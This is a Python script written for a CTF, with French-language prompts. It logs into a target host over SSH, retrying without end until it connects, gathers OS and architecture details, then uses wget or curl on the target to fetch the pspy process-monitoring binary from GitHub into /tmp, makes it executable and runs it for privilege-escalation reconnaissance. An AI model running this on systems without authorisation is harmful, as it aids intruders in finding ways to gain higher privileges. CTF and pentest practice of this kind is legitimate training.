#!/usr/bin/env python3
# Written by 0xCr0c0 for CTF
import os
import sys
import tempfile
import urllib.request
import getpass
from typing import Optional, Tuple, Dict

import paramiko
import time


def prompt(msg: str, default: Optional[str] = None) -> str:
    if default:
        val = input(f"{msg} [{default}]: ") or default
    else:
        val = input(f"{msg}: ")
    return val.strip()


def ask_auth_method() -> str:
    print("Choisissez la méthode d'authentification:")
    print("  1) Mot de passe")
    print("  2) Clé privée / Agent SSH")
    while True:
        choice = input("Votre choix (1/2): ").strip()
        if choice in {"1", "2"}:
            return choice
        print("Veuillez entrer 1 ou 2.")


def load_private_key(key_path: str, passphrase: Optional[str]) -> Optional[paramiko.PKey]:
    exceptions = []
    for KeyCls in (paramiko.RSAKey, paramiko.ECDSAKey, paramiko.Ed25519Key, paramiko.DSSKey):
        try:
            return KeyCls.from_private_key_file(key_path, password=passphrase)
        except Exception as e:
            exceptions.append(e)
    # If none worked, raise the last
    if exceptions:
        raise exceptions[-1]
    return None


def connect_ssh(host: str, port: int, user: str, auth_choice: str, cache: Optional[dict] = None) -> paramiko.SSHClient:
    # Mise à jour: support d'un cache pour éviter de re-demander les identifiants à chaque tentative
    if cache is None:
        cache = {}

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if auth_choice == "1":
        # Mot de passe
        if "password" in cache:
            password = cache["password"]
        else:
            password = getpass.getpass("Mot de passe SSH: ")
            cache["password"] = password
        client.connect(
            hostname=host,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=15,
        )
    else:
        # Clé privée / Agent
        pkey = cache.get("pkey")
        key_path = cache.get("key_path")

        if key_path is None:
            # Première fois: demander le chemin (vide => agent/clefs par défaut)
            key_path = input("Chemin vers la clé privée (laisser vide pour utiliser l'agent/clefs par défaut): ").strip()
            pkey = None
            if key_path:
                if not os.path.exists(key_path):
                    print(f"Erreur: la clé '{key_path}' est introuvable.")
                    sys.exit(1)
                passphrase = getpass.getpass("Passphrase de la clé (laisser vide si aucune): ") or None
                pkey = load_private_key(key_path, passphrase)
            cache["key_path"] = key_path
            cache["pkey"] = pkey

        client.connect(
            hostname=host,
            port=port,
            username=user,
            pkey=pkey,
            allow_agent=(pkey is None),
            look_for_keys=(pkey is None),
            timeout=15,
        )
    return client


def run_cmd(client: paramiko.SSHClient, cmd: str, timeout: int = 20) -> Tuple[int, str, str]:
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode(errors="ignore")
    err = stderr.read().decode(errors="ignore")
    rc = stdout.channel.recv_exit_status()
    return rc, out.strip(), err.strip()


def detect_system(client: paramiko.SSHClient) -> Dict[str, str]:
    info = {
        "kernel": "",
        "arch": "",
        "os": "",
        "distro": "",
        "version": "",
    }

    _, out, _ = run_cmd(client, "uname -s")
    info["kernel"] = out

    _, out, _ = run_cmd(client, "uname -m")
    info["arch"] = out

    # Try /etc/os-release
    rc, out, _ = run_cmd(client, "cat /etc/os-release")
    if rc == 0 and out:
        info["os"] = "Linux"
        for line in out.splitlines():
            if line.startswith("NAME="):
                info["distro"] = line.split("=", 1)[1].strip().strip('"')
            if line.startswith("PRETTY_NAME="):
                info["version"] = line.split("=", 1)[1].strip().strip('"')
    else:
        # Try lsb_release
        rc, out, _ = run_cmd(client, "lsb_release -ds || lsb_release -a 2>/dev/null | grep Description | cut -d: -f2-")
        if rc == 0 and out:
            info["os"] = "Linux"
            info["version"] = out.strip().strip('"')

    return info


def select_pspy_url(arch: str) -> Optional[str]:
    arch = arch.lower()
    # pspy propose des binaires x86 (32/64). ARM n'est généralement pas fourni en release.
    base = "https://github.com/DominicBreuker/pspy/releases/latest/download"
    if arch in {"x86_64", "amd64"}:
        return f"{base}/pspy64"
    if arch in {"i386", "i486", "i586", "i686"}:
        return f"{base}/pspy32"
    # Essayer risqué: quelques environnements rapportent 'x64'
    if arch in {"x64"}:
        return f"{base}/pspy64"
    return None


def try_remote_download(client: paramiko.SSHClient, url: str, dest: str) -> bool:
    # Tente wget puis curl
    cmds = [
        f"command -v wget >/dev/null 2>&1 && wget -q -O {dest} {url}",
        f"command -v curl >/dev/null 2>&1 && curl -fsSL -o {dest} {url}",
    ]
    for c in cmds:
        rc, _, _ = run_cmd(client, c)
        if rc == 0:
            return True
    return False


def local_download_then_upload(client: paramiko.SSHClient, url: str, dest: str) -> bool:
    tmp_fd, tmp_path = tempfile.mkstemp(prefix="pspy_")
    os.close(tmp_fd)
    try:
        with urllib.request.urlopen(url, timeout=20) as resp, open(tmp_path, "wb") as f:
            f.write(resp.read())
        sftp = client.open_sftp()
        sftp.put(tmp_path, dest)
        sftp.chmod(dest, 0o755)
        sftp.close()
        return True
    except Exception as e:
        print(f"[!] Téléchargement/Upload local échoué: {e}")
        return False
    finally:
        try:
            os.remove(tmp_path)
        except Exception:
            pass


def ensure_executable(client: paramiko.SSHClient, path: str) -> None:
    run_cmd(client, f"chmod +x {path}")


def main():
    print("=== Tool d'analyse de Privilege Escalation (installation pspy) ===")
    host = prompt("Adresse IP / hôte de la cible")
    user = prompt("Nom d'utilisateur")
    port_str = prompt("Port SSH", "22")
    try:
        port = int(port_str)
    except ValueError:
        print("Port invalide.")
        sys.exit(1)

    auth_choice = ask_auth_method()

    # Nouvelle logique: réessayer la connexion à l'infini jusqu'au succès
    creds_cache: dict = {}
    while True:
        try:
            client = connect_ssh(host, port, user, auth_choice, cache=creds_cache)
            print("[+] Connexion SSH réussie.")
            break
        except Exception as e:
            print(f"[!] Connexion SSH échouée: {e}")
            print("[*] Nouvelle tentative dans 5 secondes... (Ctrl+C pour arrêter)")
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                print("\n[*] Arrêt demandé par l'utilisateur.")
                sys.exit(1)

    try:
        info = detect_system(client)
        print("--- Infos système ---")
        print(f"Kernel: {info.get('kernel')}")
        print(f"Arch:   {info.get('arch')}")
        if info.get("version"):
            print(f"OS:     {info.get('version')}")

        url = select_pspy_url(info.get("arch", ""))
        if not url:
            print("[!] Architecture non supportée par les releases pspy officielles. Abandon.")
            client.close()
            sys.exit(2)

        remote_path = "/tmp/pspy"
        print(f"Téléchargement de pspy depuis {url} vers {remote_path} ...")

        ok = try_remote_download(client, url, remote_path)
        if not ok:
            print("wget/curl indisponible côté cible, tentative de téléchargement local puis upload SFTP...")
            ok = local_download_then_upload(client, url, remote_path)

        if not ok:
            print("[!] Impossible d'installer pspy sur la cible.")
            client.close()
            sys.exit(3)

        ensure_executable(client, remote_path)
        print("[+] pspy installé avec succès dans /tmp/pspy")
        
        print("[+] Lancement de pspy (appuyez sur Ctrl+C pour arrêter)...")
        try:
            
            stdin, stdout, stderr = client.exec_command("/tmp/pspy -pf -i 1000")
            # Display output in real-time
            channel = stdout.channel
            channel.setblocking(0)
            
            try:
                while not channel.exit_status_ready():
                    if channel.recv_ready():
                        data = channel.recv(1024).decode('utf-8', errors='ignore')
                        sys.stdout.write(data)
                        sys.stdout.flush()
                    
                    time.sleep(0.1)
            except Exception as e:
                print(f"\n[!] Error during pspy execution: {e}")
        except KeyboardInterrupt:
            print("\n[*] Arrêt de pspy demandé par l'utilisateur")
    finally:
        try:
            client.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
